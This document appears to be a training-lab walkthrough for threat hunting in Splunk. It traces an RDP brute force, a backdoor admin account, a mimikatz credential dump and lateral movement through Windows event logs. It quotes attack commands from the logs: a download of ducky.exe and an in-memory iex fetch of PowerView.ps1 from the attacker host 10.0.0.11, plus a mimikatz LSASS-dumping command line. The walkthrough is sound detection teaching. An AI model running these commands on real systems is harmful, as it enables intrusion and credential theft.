# Lab Environment

In this lab environment, you will have GUI access to a Kali machine. The Splunk instance should be accessible at `http://splunk.basic.local:8000`. Use the `ecthp` index for all queries.

**Objective:** Perform threat hunting in Splunk to complete the following tasks:

1. The CLIENT machine shows signs of compromise. Identify the targeted service, the attacker's IP address and hostname, and the compromised account.
    
2. The attacker attempted to maintain access. Determine the persistence mechanism used.
    
3. An executable was downloaded and executed by the attacker. Identify its MD5 hash and verify whether it is malicious.
    
4. The attacker moved laterally to the SECLOGS machine. Identify the compromised account used.
    
5. On the SECLOGS machine, the attacker downloaded and executed a script. Determine what the script was, whether it was saved to disk, and which commands were executed.
    

**Logs to Check:** Security, Sysmon and PowerShell

# Tools

The best tools for this lab are:

- Splunk
- Firefox
**Step 1:** Access the Kali machine.

![[Pics/ecthp/splunk-practical-lab/94b3567672be34aeeacc9ea86219d82156f585135d56d8e584a6f4b5ccd26810-6ec361b1ae.png|1400]]

**Step 2:** Navigate to the following URL to access Splunk:

**URL:**

```
http://splunk.basic.local:8000
```

![[Pics/ecthp/splunk-practical-lab/11fc05ce38d57d8f17cde79123b3f0435b1f77fc4526ebce4cbbc4e342d3b50d-d8bee76ea4.png|1400]]

Go to **Search and Reporting**.

![[Pics/ecthp/splunk-practical-lab/2722fdd4b91294b7c248f429204dc990107d1ba1066050d6da402fb2e4c979e9-04c7c1b865.png|1400]]

**Step 3:** Let's begin our hunt by examining the Windows Security logs first. Make sure to set the time frame to **"All time"**.

**Query:**

```
index=ecthp source="WinEventLog:Security"
```

Here,

- `index=ecthp`: This tells Splunk to search within the **ecthp** index. An index in Splunk is like a database that stores event data. Here, **ecthp** is a custom index used for our environment.
    
- `source="WinEventLog:Security":` This filters the search to events whose source is **"WinEventLog:Security"**, which corresponds to the Windows Security event log.
    

![[Pics/ecthp/splunk-practical-lab/b2bc4e7d82cf15e2179113a7d7fc963ccb229ac016145afa3a92bfcebe33f27f-ff929b6e32.png|1400]]

There are numerous events from multiple machines. Let's narrow them down to those related to the specific machine of interest:

**Query:**

```
index=ecthp source="WinEventLog:Security" host="CLIENT"
```

Here,

- `host="CLIENT"`: Filters events to those originating from a machine named **CLIENT**.

![[Pics/ecthp/splunk-practical-lab/40c7c857d1c1518d3a002cfe5214b8c8c0b408bf2013cc79dc27febf2e97de8b-fc23d89c83.png|1400]]

We now see numerous events originating only from the CLIENT machine.

Next, we’ll filter for a specific event - 4625.

**Query:**

```
index=ecthp source="WinEventLog:Security" EventCode=4625 host="CLIENT"
```

Here,

- `EventCode=4625`: Filters for event ID 4625, which represents failed logon attempts in Windows. It is helpful detecting brute-force attacks or identifying unauthorized access attempts.

![[Pics/ecthp/splunk-practical-lab/2db1814a4611f06e17d012c184052cfe2719f0531c1a0153b1220ea80cfc24c2-d7f40d1052.png|1400]]

We observe multiple such events. Expand any one of them to view the details.

![[Pics/ecthp/splunk-practical-lab/fa774819846d4065a3da8e62492dc6a9310e7bfbc173b9e5363969e8293e61ec-b5bedee8ea.png|1400]]

**Key Observations:**

- This event log (Event ID 4625) indicates a failed logon attempt on the machine `client.research.SECURITY.local` that occurred on July 1, 2025, at 5:31:54 AM.
    
- The logon type is 3, which refers to a network logon, commonly triggered when someone attempts to access the system over the network, such as via SMB, remote PowerShell, etc.
    
- The username used in the attempt was `sysadmin`, but the log indicates that the attempt failed due to an incorrect password, as shown by the failure reason "Unknown user name or bad password". The 'Account Domain' field is blank, possibly indicating a local account login attempt.
    
- Interestingly, the workstation name is listed as `kali`, suggesting the attempt originated from a Kali Linux machine. This is often a red flag in enterprise environments, as Kali is commonly used for penetration testing and offensive security.
    
- The source network address and port are not recorded, which may be due to logging limitations or the way the connection was made.
    

To identify the source network address, check the Sysmon logs for network connection events (Event ID 3) around the same time as the failed login attempt i.e. July 1, 2025, at 5:31:54 AM.

**Query:**

```
index=ecthp LogName="Microsoft-Windows-Sysmon/Operational" EventCode=3 host="CLIENT"
```

Here, the log source is `Microsoft-Windows-Sysmon/Operational`, which is where Sysmon events are typically recorded. Event ID 3 in Sysmon represents network connection events.

![[Pics/ecthp/splunk-practical-lab/500e116e11ef43e44dda1e900947ec8fe355ffaf652738878308c873b2047de8-bcac3ba353.png|1400]]

We observe a TCP connection attempt to port `3389`, which is the default port for **Remote Desktop Protocol (RDP)**. The connection was initiated from IP `10.0.0.11`(source) toward the client machine at 10.0.0.101 (destination).

Given the close timestamp and correlation with the earlier failed logon attempt (Event ID 4625), this suggests that someone, likely from a kali machine at 10.0.0.11 was attempting to brute-force the CLIENT system via RDP using invalid credentials.

Next, check for Event ID **4624** to determine whether the attack succeeded, as it indicates successful logon activity.

**Query:**

```
index=ecthp source="WinEventLog:Security" EventCode=4624 host="CLIENT" Logon_Type=10
```

Here,

- `EventCode=4624`: Filters for successful logon events.
- `Logon_Type=10`: Only include remote interactive logons, typically RDP (Remote Desktop Protocol) connections.

![[Pics/ecthp/splunk-practical-lab/02abdd7e26bb3ae848bde1ae0fe36480a1d6f94995f80d594eefc9149d25843c-ae39369354.png|1400]]

Such an event exists. The details confirm that the `sysadmin` account successfully logged in via RDP from IP address `10.0.0.11`, just moments after a series of failed logon attempts. The logon type was interactive and remote, strongly indicating that an RDP session was successfully established.

**Step 4:** Attackers often attempt to maintain access to a compromised system. One common technique is creating a new user account.

Check for event ID 4720 in the security logs to detect any new user created.

**Query:**

```
index=ecthp source="WinEventLog:Security" EventCode=4720 host="CLIENT"
```

Here,

- `EventCode=4720`: Filters for Event ID 4720. This event is generated when a new local user account is created on a Windows machine.

![[Pics/ecthp/splunk-practical-lab/a8c5006e8d038f59c2bc13b26b95d3671dbceec95529344533fb68a2c84d479f-ddc44cdb9c.png|1400]]

There does exist an event.

**Key Observations:**

- **Created Account:**
    
    - Username: `shadow`
        
    - Domain: CLIENT (indicates it is a local account)
        
    - Security ID (SID): `S-1-5-21-3250466395-192540623-711299986-1010`. This uniquely identifies the new user.
        
- **Creator Account:**
    
    - Username: `sysadmin`
        
    - SID: S-1-5-21-3250466395-192540623-711299986-1009
        

This confirms that the `sysadmin` account was used to create a new user account `shadow`.

Next, let's check whether the user `shadow` was added to any group by looking for Event ID **4732** in the Security logs.

**Query:**

```
index=ecthp source="WinEventLog:Security" EventCode=4732 host="CLIENT"
```

Here,

- `Event ID 4732`: Filters for events where a user was added to a security-enabled local group.

![[Pics/ecthp/splunk-practical-lab/a377a10b7ba261258e5bf5957b236eb9347f6324a61ac12e0d62713279e0d43a-06058dc8ca.png|1400]]

Check the first event.

- **Group Affected:**
    
    - Group Name: `Administrators`
        
    - Group Domain: Builtin → This is the local administrators group on the system.
        
- **Who Performed the Action:**
    
    - Account Name: `sysadmin`
        
    - Account Domain: CLIENT
        
    - This is the same user who logged in remotely and created the `shadow` account earlier.
        
- **Member Added:**
    
    - Security ID: Matches the SID of the previously created `shadow` account.

This means that the attacker created a backdoor admin account named `shadow` for persistent access!

Now that we know how to look for individual events, let's take it a step further and explore how Boolean operators like `OR`, `where` statements, and additional filters using `search` can be used to match specific details within an event.

**Step 5:** Next, let's check if the attacker downloaded anything, possibly something malicious, on the CLIENT machine.

**Query:**

```
index=ecthp source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 host="CLIENT"
| search Message="*iwr*" OR Message="*iex*" OR Message="*Invoke-WebRequest*"
```

Here,

- `source="WinEventLog:Microsoft-Windows-PowerShell/Operational"`: Targets the PowerShell Operational logs, which capture script block executions.
    
- `EventCode=4104`: Filters for PowerShell Script Block Logging events. These show the actual code being executed.
    
- `| search Message="*iwr*" OR Message="*iex*" OR Message="*Invoke-WebRequest*"`: Further filters logs to only include PowerShell commands that contain:
    
    - **iwr** (alias for Invoke-WebRequest) or
        
    - **iex** (alias for Invoke-Expression) or
        
    - Full command - **Invoke-WebRequest**
        
    - These commands are commonly used in attacks to download and execute remote payloads.
        

![[Pics/ecthp/splunk-practical-lab/d6f1ed1f4f71d6524e5cb1fd52b51f02bef8dfc1160d6b7434e2e3fa1aa252c2-79ec566627.png|1400]]

This PowerShell event log entry (Event ID 4104) shows that a remote command was executed on the machine CLIENT machine involving the use of `Invoke-WebRequest` to download a file. The user SID belongs to the previously used **sysadmin** account, confirming it's the same attacker.

The command executed is:

```
Invoke-WebRequest -Uri http://10.0.0.11:8000/ducky.exe -OutFile C:\Users\Public\ducky.exe
```

This command attempts to download an executable (**ducky.exe**) from a remote host (**10.0.0.11**) and save it locally to `C:\Users\Public\ducky.exe`. The remote server (10.0.0.11) is the same Kali attacker machine seen earlier.

Next, verify whether the attacker executed the downloaded file by searching for **Event ID 1** in the Sysmon logs and filtering for the process name `ducky.exe`.

**Query:**

```
index=ecthp LogName="Microsoft-Windows-Sysmon/Operational" EventCode=1 host="CLIENT"
| where like(Image, "%ducky.exe")
```

Here,

- `EventCode=1`: Filters for process creation events, which log when a new process is started.
    
- `| where like(Image, "%ducky.exe")`: Filters to show only those processes whose full path (Image) ends in **ducky.exe**.
    

![[Pics/ecthp/splunk-practical-lab/77f011e2fcdab2666e445b3fc13b82bf9cdd6f2acc1d4eb636d03bf9d6d47db5-f8ab8eec9c.png|1400]]

This Sysmon Event ID 1 log entry confirms that the executable **ducky.exe** was successfully executed on the system CLIENT.

**Key Observations:**

- **File Executed:** C:\Users\Public\ducky.exe
    
- **Product Name:** mimikatz
    
- **Description:** mimikatz for Windows — a well-known post-exploitation tool used to dump credentials.
    
- **Company:** gentilkiwi (Benjamin DELPY) — the original author of mimikatz.
    
- **Command Line Used:**
    

```
"C:\Users\Public\ducky.exe" privilege::debug sekurlsa::logonpasswords exit
```

**Mimikatz** disguised as **ducky.exe** was used to run the above command on PowerShell. It does the following:

- Elevates privilege to debug level.
    
- Extracts logon credentials from LSASS.
    
- Exits after execution.
    

It is executed by: **CLIENT\sysadmin** — the same account used throughout this attack chain.

The MD5 hash of the executable is `29EFD64DD3C7FE1E2B022B7AD73A1BA5` as seen in the log. We can use this hash to check whether the executable is malicious on **VirusTotal**.

![[Pics/ecthp/splunk-practical-lab/65f88b8370be8b4d62478ddf6e060c20042ca870104d5fd70235fc8411f199c5-c302e6a67d.png|1400]]

While tools like Mimikatz are well-known, for unknown executables, it's always a good idea to use the hash to check if they are malicious.

**Step 6:** Evidence suggests that the attacker laterally moved from the CLIENT machine to the SECLOGS machine. Verify this by checking for a successful RDP login on the SECLOGS system.

**Query:**

```
index=ecthp source="WinEventLog:Security" EventCode=4624 host="SECLOGS" Logon_Type=10
```

Note that we have changed the host to "SECLOGS" to filter events to those originating from this machine.

![[Pics/ecthp/splunk-practical-lab/4cbc901d739b0474e5d7a5cc239cdf5456e27d8f72deab6de24d5f0f41f28761-799b9dc771.png|1400]]

This Windows Security Event Log (Event ID 4624) from `seclogs.research.SECURITY.local` at 5:36:20 AM on July 1, 2025 indicates a successful logon using Remote Desktop Protocol (RDP). The machine that initiated the RDP session is 10.0.0.101 (CLIENT). The attacker used credentials (possibly stolen using mimikatz/ducky.exe) from the CLIENT system to log in via RDP to the SECLOGS server. The compromised account is `research\operator`, which is a domain account.

This is a classic lateral movement step — moving from an initially compromised host to another, more sensitive one (like a logging server).

Let's use a similar query as before to check if the attacker downloaded anything malicious on this machine.

**Query:**

```
index=ecthp source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 host="SECLOGS"
| search Message="*iwr*" OR Message="*iex*" OR Message="*Invoke-WebRequest*"
```

![[Pics/ecthp/splunk-practical-lab/c0ffe5cd0497778b4678bb52f5afb82f2fef636a4ea5ec4bda459b3687b9ec66-47ef873496.png|1400]]

**Key Observations:**

- **Command Executed:**

```
iex (New-Object Net.WebClient).DownloadString('http://10.0.0.11:8000/PowerView.ps1')
```

This translates to: “Download the PowerView.ps1 script from the attacker server (10.0.0.11) and execute it in memory using **iex**.”

- **iex (Invoke-Expression)**: Immediately executes the downloaded string in memory. So, nothing is written to disk. This technique is called in-memory execution or fileless execution, and it's a common method used by attackers to evade traditional antivirus and file-based detection.
    
- **User SID:** S-1-5-21-1693200156-3137632808-1858025440-4610. This matches the `operator` account that logged in via RDP moments earlier from the compromised CLIENT machine.
    

This confirms that a remote command was executed via PowerShell to download and execute a remote script — specifically, `PowerView.ps1`. It is a well-known PowerShell-based post-exploitation tool used primarily for Active Directory (AD) enumeration and privilege escalation within Windows environments.

**Step 7:** The domain enumeration commands that were run using PowerView should be visible under event ID 4104 in Powershell logs.

**Query:**

```
index=ecthp source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 host="SECLOGS"
```

Here,

- `EventCode=4104`: Filters for PowerShell Script Block Logging events. These show the actual code being executed.

Several events are present. A detailed examination of each should help identify the exact commands that were run.

![[Pics/ecthp/splunk-practical-lab/e1e9318f9d24e58b812791e5ee8bd3d706be99921eca8e4a83bd8c3d5e7fcff6-9b6b49c2f2.png|1400]]

For example:

![[Pics/ecthp/splunk-practical-lab/0d57860ae6829fb140b171b3141a53107108e98a5f1a07520df221e45d5985b0-c45038ebf8.png|1400]]

The command that was executed is:

```
Get-NetGroup 'Domain Admins'
```

This PowerView command retrieves information about the "Domain Admins" group, including its members. It is commonly used by attackers during post-exploitation to enumerate high-privilege accounts in an Active Directory environment.

Similarly, you should be able to identify the following commands that were executed as well:

```
Get-Domain
Get-DomainController
Get-NetComputer | select name
```

# Conclusion

In this lab, we explored how to perform threat hunting using Splunk with basic queries. By analyzing Windows event logs and Sysmon data, we saw how Splunk can help trace activity across systems, detect suspicious behavior, and investigate security incidents effectively. This demonstrates the power of Splunk as a tool for proactive threat detection and response in enterprise environments.

# References

## - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/